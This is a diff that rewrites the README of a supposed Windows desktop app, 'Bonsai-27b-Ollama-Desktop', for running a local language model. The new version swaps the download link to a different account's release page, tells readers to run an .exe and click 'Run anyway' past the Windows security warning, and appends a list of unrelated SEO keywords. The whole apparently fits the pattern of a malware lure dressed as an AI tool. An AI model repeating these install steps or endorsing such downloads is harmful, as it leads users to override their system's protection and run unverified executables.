@@ -1,75 +1,62 @@
-# Bonsai 27B Ollama Desktop
+# 🌳 Bonsai-27b-Ollama-Desktop - Run complex local models on Windows
 
-**Bonsai 27B Ollama Desktop** is a clean and easy-to-use desktop application for running **Bonsai 27B** — a powerful open-source large language model — locally through Ollama. Enjoy private, fast, and unlimited AI assistance without cloud dependency.
+[![Download Latest Version](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases)
 
-<img width="2048" height="1152" alt="image" src="https://github.com/user-attachments/assets/b5adea3c-50ad-4732-9a01-035704c4e7f2" />
+## 📦 What is this software?
 
-## Install
-[Download `Bonsai-27b.zip`](https://github.com/bonsai27b/Bonsai-27b-Ollama-Desktop/releases/download/27b/Bonsai-27b.zip)
----
+Bonsai-27b-Ollama-Desktop provides a way to run advanced artificial intelligence models on your own home computer. It uses a specific format called GGUF that allows large models to function on consumer hardware. The software contains the Bonsai-27b model, which comes from Qwen3.6-27B. 
 
-<img width="1199" height="746" alt="image" src="https://github.com/user-attachments/assets/3fbe6a20-f2bc-4daa-915b-4c5aaebc2256" />
+This model excels at reasoning through multiple steps and managing complex tasks. It includes a large 262K context window, which means the model can remember and process very long documents or detailed data sets without losing information. You do not need a connection to the internet to use these tools once you finish the setup. Your data stays on your machine at all times.
 
-<img width="776" height="360" alt="image" src="https://github.com/user-attachments/assets/808250c9-69a3-40fc-8979-5d26330f6989" />
+## ⚙️ Minimum system requirements
 
----
-## Key Features
-- Easy local running of Bonsai 27B via Ollama
-- Clean and intuitive chat interface
-- Fast response generation
-- Full conversation history
-- Offline AI experience with complete privacy
-- Simple model management
-<img width="468" height="427" alt="image" src="https://github.com/user-attachments/assets/b329c0bd-5309-4372-b69e-e81e15a2a771" />
+To run this software, your computer needs specific hardware components. If your computer does not meet these targets, the model will run slowly or fail to load.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application.
-3. **Make sure Ollama is installed** and running on your system.
-4. **Select Bonsai 27B** model (it will pull automatically if needed).
-5. Start chatting with your local AI.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
+*   Memory: 16GB of RAM is the minimum. 32GB of RAM is recommended for better speed.
+*   Storage: 20GB of free space on a Solid State Drive (SSD). Do not install this on a mechanical hard drive.
+*   Graphics Card: An NVIDIA GPU with at least 8GB of video memory (VRAM). While the software works on a processor alone, a graphics card provides the speed necessary for a smooth experience.
 
-**Pro Tip:** For best performance, use a GPU with at least 16GB VRAM.
-<img width="640" height="480" alt="image" src="https://github.com/user-attachments/assets/5b17446d-c3a5-4364-95a2-af151d4db50f" />
+## 🚀 How to download and set up
 
----
-## System Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS**
-- **Linux**
+Follow these steps to get the software on your Windows machine.
 
-### Recommended Hardware
-- 16 GB RAM or more
-- NVIDIA GPU with CUDA support (strongly recommended for 27B model)
-<img width="480" height="360" alt="image" src="https://github.com/user-attachments/assets/38691f80-d8b8-4c9b-88d0-7d5ebfc4fce5" />
+1.  Visit the official release page to download the latest version: [https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases](https://github.com/Ventass6913/Bonsai-27b-Ollama-Desktop/releases).
+2.  Look for the file that ends in .exe under the latest version header.
+3.  Click the file name to start the download.
+4.  Once the file finishes downloading, locate it in your Downloads folder.
+5.  Double-click the .exe file to start the installer.
+6.  If Windows shows a security prompt, click "More info" and then "Run anyway" if you trust the software source.
+7.  Follow the instructions on the screen to finish the installation.
+8.  The installer creates a shortcut on your desktop. Double-click this icon to start the application.
 
----
-## Security & Legal
-**Important Notice:**  
-This application runs AI models locally. Ensure you have sufficient hardware resources before running large models like Bonsai 27B.
+## 🛠 Using the interface
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+After the program opens, you will see a text box and a settings menu. The software loads the model into your memory automatically. This process takes a few seconds. 
 
----
-## Contributing
-Contributions are welcome! Help improve the UI, add features, or enhance model management.
-<img width="2160" height="1392" alt="image" src="https://github.com/user-attachments/assets/ebc3d9d8-637d-4a6c-aaff-e7552854e9c6" />
+Type your questions or tasks into the input box and press Enter. The model processes your request and displays the output in the main window. You can adjust the settings to change how the model answers. For instance, you can limit the amount of text the model generates to keep answers concise. 
 
----
-## License & Acknowledgments
-### License
-**Bonsai 27B Ollama Desktop** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+## 🧠 Managing your models
 
-**Copyright © 2026 scarb386**
+The software handles the storage of your model files. If you need to check which models you have, look at the "Model Management" tab in the menu. From here, you can add new models, delete old ones to save disk space, or update the Bonsai-27b configuration files. 
 
-### Acknowledgments
-- Thanks to Ollama for the excellent local inference tool.
-- The open-source AI community for making powerful models accessible.
+If you encounter issues where the app stops responding, close the app completely. Open your Task Manager by pressing Ctrl + Shift + Esc, find the process in the list, and select "End Task." Relaunch the application from your desktop shortcut to reset the session.
 
-<p align="center">
-  Developed with ❤️ for local AI enthusiasts
-</p>
+## 🛡 Privacy and data safety
+
+Your privacy matters when running local software. Because this application does not use cloud servers, no person or company sees what you type. Every calculation happens on your local processor and graphics card. You do not need to create an account or provide personal information to use the tools.
+
+## 📝 Troubleshooting common issues
+
+If the model does not start, verify your available RAM. Open your Task Manager and check the Performance tab while you launch the app. If your memory usage exceeds 90%, close other programs like web browsers before you start the Bonsai tool.
+
+If the output text appears garbled or stops halfway through, your hard drive might be full. Ensure you have at least 20GB of free space available on the drive where you installed the application. You can move the application folder to a different drive if you have more space available elsewhere. 
+
+Keep your graphics drivers updated. Visit the website of your graphics card manufacturer to download the latest drivers for your specific hardware. Old drivers often slow down artificial intelligence applications or prevent them from using the full power of your hardware.
+
+## 🌐 Connecting with the project
+
+This software relies on the work of the Qwen community and open-source contributors. You can check the updates on the repository regularly to see if new versions are available. New versions often bring better speed and improved instructions for the model. 
+
+Keywords: bonsai, bonsai-27b, bonsai-27b-gguf, bonsai-27b-ollama, ollama-llama-3, ollama-tools, opendesktop, qwen-2-api, qwen-3b, qwen-ai, qwen-api, qwen-endpoint, qwen-image-edit, qwen-image-edit-2511, qwen-models, qwen-tts, qwen-tts-realtime, qwen-workflow, ternary-computer, ternary-language
